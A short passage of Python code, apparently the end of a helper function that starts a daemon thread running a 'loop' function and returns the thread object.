    t = threading.Thread(target=loop, daemon=True)
    t.start()
    return t
